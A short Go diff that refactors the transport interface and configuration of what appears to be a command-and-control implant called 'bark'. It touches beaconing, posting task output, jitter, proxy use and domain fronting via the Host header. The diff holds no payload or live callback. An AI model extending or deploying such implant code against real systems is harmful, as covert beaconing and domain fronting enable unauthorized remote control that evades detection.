@@ -3,20 +3,16 @@ package bark
 import "net/http"
 
 type Barker interface {
-	beaconOut(string) ([]byte, error)
-	postOutput(string, []byte) ([]byte, error)
+	Register(string) ([]byte, error)
+	Beacon(string) ([]byte, error)
+	PostOutput(string, []byte) ([]byte, error)
 }
-
-var (
-	Barkers = make(map[string]Barker)
-)
 
 type BarkConfig struct {
 	//addr
 	BarkHost string
 
-	//Host Header and user-agent (for domain fronting)
-	DF bool
+	//Host header (for domain fronting) and user-agent
 	Hh string
 	Ua string
 
@@ -25,27 +21,9 @@ type BarkConfig struct {
 	Proxy     bool
 
 	//transport
-	QUIC bool
-	Jit  float64
-	tr   http.RoundTripper
-}
+	Jit float64
+	tr  http.RoundTripper
 
-// Beacon out over the current valid protocol.
-func Beacon(name string, url string) ([]byte, error) {
-	var body []byte
-	var err error
-
-	body, err = Barkers[name].beaconOut(url)
-	return body, err
-
-}
-
-// send output over the current valid protocol.
-func PostOut(name string, url string, taskdata []byte) ([]byte, error) {
-
-	var err error
-
-	body, err := Barkers[name].postOutput(url, taskdata)
-	return body, err
-
+	//cookies:
+	jar http.CookieJar
 }
